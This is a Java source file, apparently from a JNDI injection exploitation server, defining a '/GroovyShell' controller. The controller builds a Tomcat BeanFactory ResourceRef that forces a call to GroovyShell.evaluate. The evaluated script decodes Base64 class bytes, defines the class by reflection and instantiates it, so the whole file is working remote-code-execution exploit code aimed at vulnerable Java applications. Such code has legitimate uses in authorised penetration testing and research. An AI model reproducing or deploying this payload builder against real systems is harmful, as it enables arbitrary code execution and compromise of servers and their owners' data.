package map.jndi.controller;

import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.bean.ClassBean;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Base64;

@JNDIController
@JNDIMapping("/GroovyShell")
public class GroovyShellController extends BasicController {
    @Override
    public Object process(ClassBean classBean) {
        String code = "var bytes = java.util.Base64.getDecoder().decode('" + Base64.getEncoder().encodeToString(classBean.getData()) + "');" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                "method.setAccessible(true);" +
                "var clazz = method.invoke(classLoader, bytes, 0, bytes.length);" +
                "clazz.newInstance();";

        String script = "Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\");";

        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        ref.add(new StringRefAddr("x", script));
        return ref;
    }
}
